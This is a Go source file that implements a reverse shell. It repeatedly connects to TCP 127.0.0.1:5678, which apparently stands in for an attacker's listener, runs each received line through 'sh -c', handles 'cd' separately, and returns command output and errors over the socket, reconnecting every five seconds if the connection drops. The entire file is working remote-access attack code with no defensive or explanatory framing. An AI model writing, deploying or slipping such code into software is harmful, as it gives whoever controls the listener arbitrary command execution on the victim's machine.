package main

import (
   "bufio"
   "fmt"
   "net"
   "os/exec"
   "strings"
   "os"
   "time"
)

func listen(conn net.Conn) {
   for {
      message, _ := bufio.NewReader(conn).ReadString('\n')
      if len(message) == 0 {
         break
      }
      message = strings.TrimSuffix(string(message), "\n")
      message = strings.TrimSpace(message)

      if strings.HasPrefix(message, "cd") {
         pieces := strings.Split(message, "cd")
         os.Chdir(strings.TrimSpace(pieces[1]))
         conn.Write([]byte(" "))
      } else {
         output, err := exec.Command("sh", "-c", string(message)).Output()
         if err != nil {
            conn.Write([]byte(string(err.Error())))
         }
         conn.Write([]byte(output))
      }
   }
}

func main() {
   for {
      conn, err := net.Dial("tcp", "127.0.0.1:5678")
      if err != nil {
         fmt.Println(err)
         time.Sleep(5 * time.Second)
         continue
      }
      listen(conn)
   }
}